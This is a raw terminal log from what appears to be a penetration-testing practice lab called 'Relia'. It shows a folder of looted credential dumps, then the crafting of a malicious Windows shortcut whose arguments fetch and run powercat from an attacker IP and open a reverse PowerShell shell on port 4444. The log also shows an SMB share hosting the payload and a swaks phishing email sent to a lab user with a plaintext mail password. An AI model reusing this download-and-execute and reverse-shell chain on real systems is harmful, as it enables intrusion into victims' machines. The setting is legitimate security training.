@@ -1,0 +1,372 @@
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Relia/Loot[0m]
+└─[1m[34m$[0m ls
+ 172_ips.txt          EXTERNAL_secrets     [1m[32mLEGACY_SAM[0m          shell.aspx       WEB02_system.txt
+ 192_ips.txt          [1m[34mEXTERNAL_SMB[0m         LEGACY_secrets      target.txt       WelcomeLetter.pdf
+ 247_ffuf             EXTERNAL_SYSTEM      [1m[32mLEGACY_SYSTEM[0m       [1m[32mtest.sh[0m          WINPREP_mimikatz.txt
+ [1m[32m29316.py[0m             EXTNERNAL_mimikatz   Mission.pdf         umbraco.pdf      WINPREP_SAM
+ all_ips.txt          gp.ps1               New-Hire-Form.pdf   users.txt        WINPREP_secrets
+'Database (2).kdbx'   hashes.txt           [1m[34mnmap[0m                WEB02_mimikatz   WINPREP_SYSTEM
+ Database.kdbx        ips.txt              passwords.txt       WEB02_sam.txt
+ EXTERNAL_SAM         LEGACY_mimikatz     'Policies (2).pdf'   WEB02_secrets
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Relia/Loot[0m]
+└─[1m[34m$[0m cd ~/TEST/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m ls
+automatic_configurator.lnk  body.txt  config.Library-ms  swaks
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m rm automatic_configurator.lnk
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m vim body.txt
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m ls
+body.txt  config.Library-ms  swaks
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m exiftool ~/info.pdf^C
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m vim config.Library-ms
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m bash ./swaks
+[sudo] password for sk4t4:
+Username: maildmz@relia.com
+Password: DPuBT9tGCBrTbR
+=== Trying 192.168.239.189:25...
+=== Connected to 192.168.239.189.
+<-  220 MAIL ESMTP
+ -> EHLO kali
+<-  250-MAIL
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN
+<-  250 HELP
+ -> AUTH LOGIN
+<-  334 VXNlcm5hbWU6
+ -> bWFpbGRtekByZWxpYS5jb20=
+<-  334 UGFzc3dvcmQ6
+ -> RFB1QlQ5dEdDQnJUYlI=
+<-  235 authenticated.
+ -> MAIL FROM:<CMS-maildmz@relia.com>
+<-  250 OK
+ -> RCPT TO:<jim@relia.com>
+<-  250 OK
+ -> DATA
+<-  354 OK, send.
+ -> 46 lines sent
+<-  250 Queued (8.859 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m vim
+automatic_configurator.lnk  config.Library-ms
+body.txt                    swaks
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m vim config.Library-ms
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m pylnk3 p automatic_configurator.lnk
+Target file:
+{ 'archive': False,
+  'compressed': False,
+  'directory': False,
+  'encrypted': False,
+  'hidden': False,
+  'normal': False,
+  'not_content_indexed': False,
+  'offline': False,
+  'read_only': False,
+  'reparse_point': False,
+  'reserved1': False,
+  'reserved2': False,
+  'sparse_file': False,
+  'system_file': False,
+  'temporary': False}
+Creation Time: 2026-04-19 08:37:27
+Modification Time: 2026-04-19 08:37:27
+Access Time: 2026-04-19 08:37:27
+File size: 0
+Window mode: Minimized
+Hotkey:
+File Location Info: <not specified>
+<LinkTargetIDList>:
+  <RootEntry: MY_COMPUTER>
+  <DriveEntry: b'C:'>
+  <PathSegmentEntry: C:>
+  <PathSegmentEntry: Program Files>
+  <PathSegmentEntry: PowerShell>
+  <PathSegmentEntry: 7>
+  <PathSegmentEntry: pwsh.exe>
+Working Directory: b'C:\\Program Files\\PowerShell\\7\\'
+Commandline Arguments: b'-c "IEX\\(New-Object System.Net.WebClient\\).DownloadString\\(\'http://192.168.4
+5.189/powercat.ps1\'\\);powercat -c 192.168.45.189 -p 4444 -e powershell"'
+Used Path: C:\C:\Program Files\PowerShell\7\pwsh.exe
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m vim config.Library-ms
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m rm automatic_configurator.lnk
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m vim config.Library-ms
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m impacket-smbserver SHARE ./ -smb2support
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+^C
+Interrupted, exiting...
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m impacket-smbserver SHARE ./ -smb2support
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+^C
+Interrupted, exiting...
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m impacket-smbserver SHARE ./ -smb2support -username sk4t4 -password sk4t4
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+[*] NetrGetShareInfo Level: 1
+^C
+Interrupted, exiting...
+^CTraceback (most recent call last):
+  File "/usr/lib/python3.13/threading.py", line 1543, in _shutdown
+    _thread_shutdown()
+KeyboardInterrupt:
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m ls
+[1m[32mautomatic_configurator.lnk[0m  body.txt  config.Library-ms  swaks
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m vim body.txt
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m bash ./swaks
+Username: maildmz@relia.com
+Password: DPuBT9tGCBrTbR
+=== Trying 192.168.239.189:25...
+=== Connected to 192.168.239.189.
+<-  220 MAIL ESMTP
+ -> EHLO kali
+<-  250-MAIL
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN
+<-  250 HELP
+ -> AUTH LOGIN
+<-  334 VXNlcm5hbWU6
+ -> bWFpbGRtekByZWxpYS5jb20=
+<-  334 UGFzc3dvcmQ6
+ -> RFB1QlQ5dEdDQnJUYlI=
+<-  235 authenticated.
+ -> MAIL FROM:<CMS-maildmz@relia.com>
+<-  250 OK
+ -> RCPT TO:<jim@relia.com>
+<-  250 OK
+ -> DATA
+<-  354 OK, send.
+ -> 46 lines sent
+<-  250 Queued (8.640 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m pylnk3 p automatic_configurator.lnk
+Target file:
+{ 'archive': True,
+  'compressed': False,
+  'directory': False,
+  'encrypted': False,
+  'hidden': False,
+  'normal': False,
+  'not_content_indexed': False,
+  'offline': False,
+  'read_only': False,
+  'reparse_point': False,
+  'reserved1': False,
+  'reserved2': False,
+  'sparse_file': False,
+  'system_file': False,
+  'temporary': False}
+Creation Time: 2021-06-05 05:07:00.067986
+Modification Time: 2021-06-05 05:07:00.067986
+Access Time: 2026-04-19 09:56:31.731316
+File size: 450560
+Window mode: Normal
+Hotkey:
+File Location Info:
+  (local)
+  Volume Type: Fixed (Hard disk)
+  Volume Serial Number: 2752536698
+  Volume Label:
+  Path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+<LinkTargetIDList>:
+  <RootEntry: MY_COMPUTER>
+  <DriveEntry: b'C:'>
+  <PathSegmentEntry: Windows>
+  <PathSegmentEntry: System32>
+  <PathSegmentEntry: WindowsPowerShell>
+  <PathSegmentEntry: v1.0>
+  <PathSegmentEntry: powershell.exe>
+Relative Path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Working Directory: C:\Windows\System32\WindowsPowerShell\v1.0
+Commandline Arguments: -c 'IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.249:800
+0/powercat.ps1');powercat -c 192.168.45.189 -p 4444 -e powershell"
+Used Path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ExtraDataBlock
+ signature 0xa0000005
+ data: b'%\x00\x00\x00\xdd\x00\x00\x00'
+ExtraDataBlock
+ signature 0xa000000b
+ data: b'wN\xc1\x1a\xe7\x02]N\xb7D.\xb1\xaeQ\x98\xb7\xdd\x00\x00\x00'
+ExtraDataBlock
+ signature 0xa0000003
+ data: b'X\x00\x00\x00\x00\x00\x00\x00winprep\x00\x00\x00\x00\x00\x00\x00\x00\x00\xeaa\\\x18\xccT4N\xb5\x
+ce\xa7\x89f\x0f\xb3X\xe0\xb9/||H\xed\x11\x80\x17\x00PV\x8a\xc4a\xeaa\\\x18\xccT4N\xb5\xce\xa7\x89f\x0f\xb
+3X\xe0\xb9/||H\xed\x11\x80\x17\x00PV\x8a\xc4a'
+PropertyStoreDataBlock
+ PropertyStore
+  FormatID: {DABD30ED-0043-4789-A7F8-D013A4736622}
+  100 = 0x1f: v1.0 (C:\Windows\System32\WindowsPowerShell)
+ PropertyStore
+  FormatID: {46588AE2-4CBC-4338-BBFC-139326986DCE}
+    4 = 0x1f: S-1-5-21-1668376978-2087646156-2834574368-1001
+ PropertyStore
+  FormatID: {B725F130-47EF-101A-A5F1-02608C9EEBAC}
+   10 = 0x1f: powershell.exe
+   15 = 0x40: 2021-06-05 05:07:02
+   12 = 0x15: 450560
+    4 = 0x1f: Application
+   14 = 0x40: 2021-06-05 05:07:00.067986
+ PropertyStore
+  FormatID: {28636AA6-953D-11D2-B5D6-00C04FD918D0}
+   30 = 0x1f: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ PropertyStore
+  FormatID: {446D16B1-8DAD-4870-A748-402EA43D788C}
+  104 = 0x48: {8DAE34D9-4971-4AFE-A812-5A0C6D65204E}
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m impacket-smbserver SHARE ./ -smb2support -username sk4t4 -password sk4t4
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+[*] NetrGetShareInfo Level: 1
+^C
+Interrupted, exiting...
+^CTraceback (most recent call last):
+  File "/usr/lib/python3.13/threading.py", line 1543, in _shutdown
+    _thread_shutdown()
+KeyboardInterrupt:
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m pylnk3 p automatic_configurator.lnk
+Target file:
+{ 'archive': True,
+  'compressed': False,
+  'directory': False,
+  'encrypted': False,
+  'hidden': False,
+  'normal': False,
+  'not_content_indexed': False,
+  'offline': False,
+  'read_only': False,
+  'reparse_point': False,
+  'reserved1': False,
+  'reserved2': False,
+  'sparse_file': False,
+  'system_file': False,
+  'temporary': False}
+Creation Time: 2021-06-05 05:07:00.067986
+Modification Time: 2021-06-05 05:07:00.067986
+Access Time: 2026-04-19 10:08:07.743031
+File size: 450560
+Window mode: Normal
+Hotkey:
+File Location Info:
+  (local)
+  Volume Type: Fixed (Hard disk)
+  Volume Serial Number: 2752536698
+  Volume Label:
+  Path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+<LinkTargetIDList>:
+  <RootEntry: MY_COMPUTER>
+  <DriveEntry: b'C:'>
+  <PathSegmentEntry: Windows>
+  <PathSegmentEntry: System32>
+  <PathSegmentEntry: WindowsPowerShell>
+  <PathSegmentEntry: v1.0>
+  <PathSegmentEntry: powershell.exe>
+Relative Path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Working Directory: C:\Windows\System32\WindowsPowerShell\v1.0
+Commandline Arguments: -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.189:800
+0/powercat.ps1');powercat -c 192.168.45.189 -p 4444 -e powershell"
+Used Path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ExtraDataBlock
+ signature 0xa0000005
+ data: b'%\x00\x00\x00\xdd\x00\x00\x00'
+ExtraDataBlock
+ signature 0xa000000b
+ data: b'wN\xc1\x1a\xe7\x02]N\xb7D.\xb1\xaeQ\x98\xb7\xdd\x00\x00\x00'
+ExtraDataBlock
+ signature 0xa0000003
+ data: b'X\x00\x00\x00\x00\x00\x00\x00winprep\x00\x00\x00\x00\x00\x00\x00\x00\x00\xeaa\\\x18\xccT4N\xb5\x
+ce\xa7\x89f\x0f\xb3X\xe0\xb9/||H\xed\x11\x80\x17\x00PV\x8a\xc4a\xeaa\\\x18\xccT4N\xb5\xce\xa7\x89f\x0f\xb
+3X\xe0\xb9/||H\xed\x11\x80\x17\x00PV\x8a\xc4a'
+PropertyStoreDataBlock
+ PropertyStore
+  FormatID: {DABD30ED-0043-4789-A7F8-D013A4736622}
+  100 = 0x1f: v1.0 (C:\Windows\System32\WindowsPowerShell)
+ PropertyStore
+  FormatID: {46588AE2-4CBC-4338-BBFC-139326986DCE}
+    4 = 0x1f: S-1-5-21-1668376978-2087646156-2834574368-1001
+ PropertyStore
+  FormatID: {B725F130-47EF-101A-A5F1-02608C9EEBAC}
+   10 = 0x1f: powershell.exe
+   15 = 0x40: 2021-06-05 05:07:02
+   12 = 0x15: 450560
+    4 = 0x1f: Application
+   14 = 0x40: 2021-06-05 05:07:00.067986
+ PropertyStore
+  FormatID: {28636AA6-953D-11D2-B5D6-00C04FD918D0}
+   30 = 0x1f: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ PropertyStore
+  FormatID: {446D16B1-8DAD-4870-A748-402EA43D788C}
+  104 = 0x48: {8DAE34D9-4971-4AFE-A812-5A0C6D65204E}
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m bash ./swaks
+Username: maildmz@relia.com
+Password: DPuBT9tGCBrTbR
+=== Trying 192.168.239.189:25...
+=== Connected to 192.168.239.189.
+<-  220 MAIL ESMTP
+ -> EHLO kali
+<-  250-MAIL
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN
+<-  250 HELP
+ -> AUTH LOGIN
+<-  334 VXNlcm5hbWU6
+ -> bWFpbGRtekByZWxpYS5jb20=
+<-  334 UGFzc3dvcmQ6
+ -> RFB1QlQ5dEdDQnJUYlI=
+<-  235 authenticated.
+ -> MAIL FROM:<CMS-maildmz@relia.com>
+<-  250 OK
+ -> RCPT TO:<jim@relia.com>
+<-  250 OK
+ -> DATA
+<-  354 OK, send.
+ -> 46 lines sent
+<-  250 Queued (8.578 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m vim
+automatic_configurator.lnk  config.Library-ms
+body.txt                    swaks
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m vim config.Library-ms
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/TEST[0m]
+└─[1m[34m$[0m
